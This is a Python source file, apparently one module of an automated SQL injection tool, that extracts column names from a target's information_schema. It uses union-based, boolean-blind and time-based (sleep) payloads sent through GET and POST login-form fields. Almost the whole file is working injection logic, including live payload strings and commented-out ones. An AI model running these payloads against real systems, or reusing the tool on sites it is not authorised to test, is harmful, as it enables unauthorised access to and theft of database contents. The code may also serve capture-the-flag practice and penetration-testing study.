#!/usr/bin/env python
# -*- coding:utf-8 -*-
from config import UnpackFunction
from lib.log import logger
from tables import SqliTables
from tqdm import trange

__author__ = "LoRexxar"


class SqliColumns(SqliTables):
    def __init__(self):
        SqliTables.__init__(self)

    # 获取列名
    def get_columns(self):

        # 若tables_name未设置，则全跑一遍
        if len(self.tables_name) == 0:
            SqliTables.get_tables(self)

        # 设定一个循环的标志位
        i = 0

        # 首先是每个database_name
        for database_name in self.tables_name:

            # 每个databases_name声明为一个字典
            self.columns_name[database_name]={}

            # 每个table_name需要跑一次columns_name
            for table_name in self.tables_name[database_name]:

                # 每个table_name中的columns_name声明为一个列表储存
                columns_name = []

                # 开始跑columns_name
                logger.debug("Start sqli databases %s's tables %s's columns..." % (database_name, table_name))

                # 先GET
                if self.sqlirequest == "GET":
                    logger.debug("The sqlirequest is %s, start sqli columns..." % self.sqlirequest)

                    if self.sqlimethod == "normal":

                        logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                        logger.debug("Start table's %s column amount sqli..." % table_name)

                        # 先注columns的数量
                        # payload = "user=ddog' union all SELECT 1,COUNT(column_name) from information_schema.columns WHERE table_name = '" + table_name + "' %26%26 table_schema = '" + database_name + "' limit 0,1%23&passwd=ddog123&submit=Log+In"
                        payload = self.dealpayload.construct_normal_payload(select="COUNT(column_name)",
                                                                            source="information_schema.columns",
                                                                            conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'")
                        r = self.Data.GetData(payload)
                        columns_number = int(UnpackFunction(r))
                        logger.debug("Columns account sqli success...The columns_number is %d..." % columns_number)
                        logger.info("[*] columns_number: %d" % columns_number)

                        # 每个循环跑一次columns的数据
                        for i in trange(int(columns_number), desc="Column sqli...", leave=False, disable=True):
                            # 首先是column name的长度
                            logger.debug("Start %dth column length sqli..." % (i + 1))
                            # payload = "user=ddog' union all SELECT 1,length(column_name) from information_schema.columns WHERE table_name = '" + table_name + "' %26%26 table_schema = '" + database_name + "' limit " + repr(i) + ",1%23&passwd=ddog123&submit=Log+In"
                            payload = self.dealpayload.construct_normal_payload(select="length(column_name)",
                                                                                source="information_schema.columns",
                                                                                conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
                                                                                limit=i)
                            r = self.Data.GetData(payload)
                            column_name_len = int(UnpackFunction(r))

                            logger.debug("%dth Column name length sqli success...The column_name_len is %d..." % ((i + 1), column_name_len))
                            logger.info("[*] %dth column_name_len: %d" % ((i + 1), column_name_len))

                            # 然后注columns name
                            # payload = "user=ddog' union all SELECT 1,column_name from information_schema.columns WHERE table_name = '" + table_name + "' %26%26 table_schema = '" + database_name + "' limit " + repr(i) + ",1%23&passwd=ddog123&submit=Log+In"
                            payload = self.dealpayload.construct_normal_payload(select="column_name",
                                                                                source="information_schema.columns",
                                                                                conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
                                                                                limit=i)
                            r = self.Data.GetData(payload)
                            column_name = UnpackFunction(r)
                            logger.debug("%dth Column name sqli success...The column_name is %s..." % ((i + 1), column_name))

                            # 把columns_name插入列表
                            columns_name.append(column_name)
                            logger.info("[*] %dth column_name: %s" % ((i + 1), column_name))

                    elif self.sqlimethod == "build":

                        logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                        logger.debug("Start table's %s column amount sqli..." % table_name)

                        for i in trange(100, desc='Column amount sqli', leave=False):
                            # 先注columns的数量
                            # payload = "user=user1' %26%26 (SElECT ((SELECT COUNT(column_name) from information_schema.columns WHERE table_name = '" + table_name + "' %26%26 table_schema = '" + database_name + "' limit 0,1) > " + repr(
                            #     i) + "))%23&passwd=ddog123&submit=Log+In"
                            payload = self.dealpayload.construct_build_payload(select="COUNT(column_name)",
                                                                               source="information_schema.columns",
                                                                               conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
                                                                               compare=i)
                            if self.Data.GetBuildData(payload, self.len) == 0:
                                columns_number = i
                                break

                        logger.debug("Columns account sqli success...The columns_number is %d..." % columns_number)
                        logger.info("[*] columns_number: %d" % columns_number)

                        for i in range(0, int(columns_number)):
                            # 然后注 columns_number 的 length
                            logger.debug("Start %dth column length sqli..." % (i + 1))
                            for j in trange(50, desc="%dth Column length sqli..." % (i + 1), leave=False):
                                # payload = "user=user1' %26%26 (select ((SELECT length(column_name) from information_schema.columns WHERE table_name = '" + table_name + "' %26%26 table_schema = '" + database_name + "' limit " + repr(
                                #     i) + ",1) > " + repr(j) + "))%23&passwd=ddog123&submit=Log+In"
                                payload = self.dealpayload.construct_build_payload(select="length(column_name)",
                                                                                   source="information_schema.columns",
                                                                                   conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
                                                                                   limit=i,
                                                                                   compare=j)
                                if self.Data.GetBuildData(payload, self.len) == 0:
                                    column_name_len = j
                                    break
                                elif j == 50:
                                    logger.error("Column length > 50...")
                                    column_name_len = 50

                            logger.debug("%dth Column name length sqli success...The column_name_len is %d..." % ((i + 1), column_name_len))
                            logger.info("[*] %dth column_name_len: %d" % ((i + 1), column_name_len))

                            # 然后注column名字
                            # 清空column_name
                            column_name = ""
                            logger.debug("Start %dth column sqli..." % (i + 1))
                            for j in trange(int(column_name_len), desc='%dth Column sqli' % (i + 1), leave=False):
                                for k in trange(100, desc='%dth Column\'s %dth char sqli' % ((i + 1), (j + 1)),
                                                leave=False):
                                    # payload = "user=user1' %26%26 (select ((SELECT ascii(substring(column_name," + repr(
                                    #     j + 1) + ",1)) from information_schema.columns WHERE table_name = '" + table_name + "' %26%26 table_schema = '" + database_name + "' limit " + repr(
                                    #     i) + ",1) >" + repr(k + 30) + "))%23&passwd=ddog123&submit=Log+In"
                                    payload = self.dealpayload.construct_build_payload(select="ascii(substring(column_name," + repr(j + 1) + ",1))",
                                                                                       source="information_schema.columns",
                                                                                       conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
                                                                                       limit=i,
                                                                                       compare=(k + 30))
                                    if self.Data.GetBuildData(payload, self.len) == 0:
                                        column_name += chr(int(k + 30))
                                        break

                            logger.debug("%dth Column name sqli success...The column_name is %s..." % ((i + 1), column_name))

                            # 把columns_name插入列表
                            columns_name.append(column_name)
                            logger.info("[*] %dth column_name: %s" % ((i + 1), column_name))

                    elif self.sqlimethod == "time":

                        logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                        logger.debug("Start table's %s column amount sqli..." % table_name)

                        for i in trange(100, desc='Column amount sqli', leave=False):

                            # 先注columns的数量
                            payload = "user=ddog' union SELECT 1,if((SELECT COUNT(column_name) from information_schema.columns WHERE table_name = '" + table_name + "' %26%26 table_schema = '" + database_name + "' limit 0,1) > " + repr(
                                i) + ",sleep(" + repr(self.time) + "),0)%23&passwd=ddog123&submit=Log+In"
                            if self.Data.GetTimeData(payload, self.time) == 0:
                                columns_number = i
                                break

                        logger.debug("Columns account sqli success...The columns_number is %d..." % columns_number)
                        logger.info("[*] columns_number: %d" % columns_number)

                        for i in range(0, int(columns_number)):
                            # 然后注 columns_number 的 length
                            logger.debug("Start %dth column length sqli..." % (i + 1))
                            for j in trange(50, desc="%dth Column length sqli..." % (i + 1), leave=False):
                                payload = "user=ddog' union SELECT 1,if((SELECT length(column_name) from information_schema.columns WHERE table_name = '" + table_name + "' %26%26 table_schema = '" + database_name + "' limit " + repr(
                                    i) + ",1) > " + repr(j) + ",sleep(" + repr(self.time) + "),0)%23&passwd=ddog123&submit=Log+In"

                                if self.Data.GetTimeData(payload, self.time) == 0:
                                    column_name_len = j
                                    break
                                elif j == 50:
                                    logger.error("Column length > 50...")
                                    column_name_len = 50

                            logger.debug("%dth Column name length sqli success...The column_name_len is %d..." % ((i + 1), column_name_len))
                            logger.info("[*] %dth column_name_len: %d" % ((i + 1), column_name_len))

                            # 然后注columns名字
                            # 清空column_name
                            column_name = ""
                            logger.debug("Start %dth column sqli..." % (i + 1))
                            for j in trange(int(column_name_len), desc='%dth Column sqli' % (i + 1), leave=False):
                                for k in trange(100, desc='%dth Column\'s %dth char sqli' % ((i + 1), (j + 1)),
                                                leave=False):
                                    payload = "user=ddog' union SELECT 1,if((SELECT  ascii(substring(column_name," + repr(
                                        j + 1) + ",1)) from information_schema.columns WHERE table_name = '" + table_name + "' %26%26 table_schema = '" + database_name + "' limit " + repr(
                                        i) + ",1) > " + repr(k + 30) + ",sleep(" + repr(self.time) + "),0)%23&passwd=ddog123&submit=Log+In"

                                    if self.Data.GetTimeData(payload, self.time) == 0:
                                        column_name += chr(int(k + 30))
                                        break

                            logger.debug("%dth Column name sqli success...The column_name is %s..." % ((i + 1), column_name))

                            # 把columns_name插入列表
                            columns_name.append(column_name)
                            logger.info("[*] %dth column_name: %s" % ((i + 1), column_name))

                # 然后是post
                elif self.sqlirequest == "POST":
                    logger.debug("The sqlirequest is %s, start sqli tables..." % self.sqlirequest)

                    if self.sqlimethod == "normal":

                        logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                        logger.debug("Start table's %s column amount sqli..." % table_name)

                        # 先注columns的数量
                        # payload = {
                        #     "user": "admi' union all SELECT 1,COUNT(column_name) from information_schema.columns WHERE table_name = '" + table_name + "' && table_schema = '" + database_name + "' limit 0,1#",
                        #     "passwd": "ddog123"}
                        payload = self.dealpayload.construct_normal_payload(select="COUNT(column_name)",
                                                                            source="information_schema.columns",
                                                                            conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'")
                        r = self.Data.PostData(payload)
                        columns_number = int(UnpackFunction(r))
                        logger.debug("Columns account sqli success...The columns_number is %d..." % columns_number)
                        logger.info("[*] columns_number: %d" % columns_number)

                        # 每个循环跑一次columns的数据
                        for i in trange(int(columns_number), desc="Column sqli...", leave=False, disable=True):

                            # 首先是column name的长度
                            logger.debug("Start %dth column length sqli..." % (i + 1))
                            # payload = {
                            #     "user": "ddog' union all SELECT 1,length(column_name) from information_schema.columns WHERE table_name = '" + table_name + "' && table_schema = '" + database_name + "' limit " + repr(
                            #         i) + ",1#", "passwd": "ddog123&submit=Log+In"}
                            payload = self.dealpayload.construct_normal_payload(select="length(column_name)",
                                                                                source="information_schema.columns",
                                                                                conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
                                                                                limit=i)
                            r = self.Data.PostData(payload)
                            column_name_len = int(UnpackFunction(r))

                            logger.debug("%dth Column name length sqli success...The column_name_len is %d..." % ((i + 1), column_name_len))
                            logger.info("[*] %dth column_name_len: %d" % ((i + 1), column_name_len))

                            # 然后注columns_name
                            # payload = {
                            #     "user": "ddog' union all SELECT 1,column_name from information_schema.columns WHERE table_name = '" + table_name + "' && table_schema = '" + database_name + "' limit " + repr(
                            #         i) + ",1#", "passwd": "ddog123"}
                            payload = self.dealpayload.construct_normal_payload(select="column_name",
                                                                                source="information_schema.columns",
                                                                                conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
                                                                                limit=i)
                            r = self.Data.PostData(payload)
                            column_name = UnpackFunction(r)
                            logger.debug("%dth Column name sqli success...The column_name is %s..." % ((i + 1), column_name))

                            # 把columns_name插入列表
                            columns_name.append(column_name)
                            logger.info("[*] %dth column_name: %s" % ((i + 1), column_name))

                    elif self.sqlimethod == "build":

                        logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                        logger.debug("Start table's %s column amount sqli..." % table_name)

                        for i in trange(100, desc='Column amount sqli', leave=False):
                            # 先注columns的数量
                            # payload = {
                            #     "user": "user1' && (SElECT ((SELECT COUNT(column_name) from information_schema.columns WHERE table_name = '" + table_name + "' && table_schema = '" + database_name + "' limit 0,1) > " + repr(
                            #         i) + "))#", "passwd": "ddog123"}
                            payload = self.dealpayload.construct_build_payload(select="COUNT(column_name)",
                                                                               source="information_schema.columns",
                                                                               conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
                                                                               compare=i)
                            if self.Data.PostBuildData(payload, self.len) == 0:
                                columns_number = i
                                break

                        logger.debug("Columns account sqli success...The columns_number is %d..." % columns_number)
                        logger.info("[*] columns_number: %d" % columns_number)

                        for i in range(0, int(columns_number)):
                            # 然后注 columns_number 的 length
                            logger.debug("Start %dth column length sqli..." % (i + 1))
                            for j in trange(50, desc="%dth Column length sqli..." % (i + 1), leave=False):
                                # payload = {
                                #     "user": "user1' && (select ((SELECT length(column_name) from information_schema.columns WHERE table_name = '" + table_name + "' && table_schema = '" + database_name + "' limit " + repr(
                                #         i) + ",1) > " + repr(j) + "))#", "passwd": "ddog123"}
                                payload = self.dealpayload.construct_build_payload(select="length(column_name)",
                                                                                   source="information_schema.columns",
                                                                                   conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
                                                                                   limit=i,
                                                                                   compare=j)
                                if self.Data.PostBuildData(payload, self.len) == 0:
                                    column_name_len = j
                                    break
                                elif j == 50:
                                    logger.error("Column length > 50...")
                                    column_name_len = 50

                            logger.debug("%dth Column name length sqli success...The column_name_len is %d..." % ((i + 1), column_name_len))
                            logger.info("[*] %dth column_name_len: %d" % ((i + 1), column_name_len))

                            # 然后注columns名字
                            # 清空column_name
                            column_name = ""
                            logger.debug("Start %dth column sqli..." % (i + 1))
                            for j in trange(int(column_name_len), desc='%dth Column sqli' % (i + 1), leave=False):
                                for k in trange(100, desc='%dth Column\'s %dth char sqli' % ((i + 1), (j + 1)),
                                                leave=False):
                                    # payload = {"user": "user1' && (select ((SELECT ascii(substring(column_name," + repr(
                                    #     j + 1) + ",1)) from information_schema.columns WHERE table_name = '" + table_name + "' && table_schema = '" + database_name + "' limit " + repr(
                                    #     i) + ",1) >" + repr(k + 30) + "))#", "passwd": "ddog123"}
                                    payload = self.dealpayload.construct_build_payload(
                                        select="ascii(substring(column_name," + repr(j + 1) + ",1))",
                                        source="information_schema.columns",
                                        conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
                                        limit=i,
                                        compare=(k + 30))
                                    if self.Data.PostBuildData(payload, self.len) == 0:
                                        column_name += chr(int(k + 30))
                                        break

                            logger.debug(
                                "%dth Column name sqli success...The column_name is %s..." % ((i + 1), column_name))

                            # 把columns_name插入列表
                            columns_name.append(column_name)
                            logger.info("[*] %dth column_name: %s" % ((i + 1), column_name))

                    elif self.sqlimethod == "time":

                        logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                        logger.debug("Start table's %s column amount sqli..." % table_name)

                        for i in trange(100, desc='Column amount sqli', leave=False):
                            # 先注columns的数量
                            payload = {
                                "user": "admi' union SELECT 1,if((SELECT COUNT(column_name) from information_schema.columns WHERE table_name = '" + table_name + "' && table_schema = '" + database_name + "' limit 0,1) > " + repr(
                                    i) + ",sleep(" + repr(self.time) + "),0)#", "passwd": "ddog123"}
                            if self.Data.PostTimeData(payload, self.time) == 0:
                                columns_number = i
                                break

                        logger.debug("Columns account sqli success...The columns_number is %d..." % columns_number)
                        logger.info("[*] columns_number: %d" % columns_number)

                        for i in range(0, int(columns_number)):
                            # 然后注 columns_number 的 length
                            logger.debug("Start %dth column length sqli..." % (i + 1))
                            for j in trange(50, desc="%dth Column length sqli..." % (i + 1), leave=False):
                                payload = {
                                    "user": "admi' union SELECT 1,if((SELECT length(column_name) from information_schema.columns WHERE table_name = '" + table_name + "' && table_schema = '" + database_name + "' limit " + repr(
                                        i) + ",1) > " + repr(j) + ",sleep(" + repr(self.time) + "),0)#", "passwd": "ddog123"}

                                if self.Data.PostTimeData(payload, self.time) == 0:
                                    column_name_len = j
                                    break
                                elif j == 50:
                                    logger.error("Column length > 50...")
                                    column_name_len = 50

                            logger.debug("%dth Column name length sqli success...The column_name_len is %d..." % ((i + 1), column_name_len))
                            logger.info("[*] %dth column_name_len: %d" % ((i + 1), column_name_len))

                            # 然后注columns名字
                            # 清空column_name
                            column_name = ""
                            logger.debug("Start %dth column sqli..." % (i + 1))
                            for j in trange(int(column_name_len), desc='%dth Column sqli' % (i + 1), leave=False):
                                for k in trange(100, desc='%dth Column\'s %dth char sqli' % ((i + 1), (j + 1)),
                                                leave=False):
                                    payload = {"user": "admi' union SELECT 1,if((SELECT  ascii(substring(column_name," + repr(
                                        j + 1) + ",1)) from information_schema.columns WHERE table_name = '" + table_name + "' && table_schema = '" + database_name + "' limit " + repr(
                                        i) + ",1) > " + repr(k + 30) + ",sleep(" + repr(self.time) + "),0)#", "passwd": "ddog123"}

                                    if self.Data.PostTimeData(payload, self.time) == 0:
                                        column_name += chr(int(k + 30))
                                        break

                            logger.debug("%dth Column name sqli success...The column_name is %s..." % ((i + 1), column_name))

                            # 把columns_name插入列表
                            columns_name.append(column_name)
                            logger.info("[*] %dth column_name: %s" % ((i + 1), column_name))

                # 把注入得到的columns_name列表转为元组
                self.columns_name[database_name][table_name] = tuple(columns_name)
        logger.info("Sqli result:")
        # 输出所有的列名
        for database_name in self.columns_name:
            tables_name = ""
            for table_name in self.columns_name[database_name]:
                tables_name += table_name
                tables_name += ','
                columns_name = ""
                for column_name in self.columns_name[database_name][table_name]:
                    columns_name += column_name
                    columns_name += ','

                logger.info("Table %s has columns %s", table_name, columns_name)
            logger.info("Database %s has tables %s", database_name, tables_name)

        print "[*]Columns list:", self.columns_name
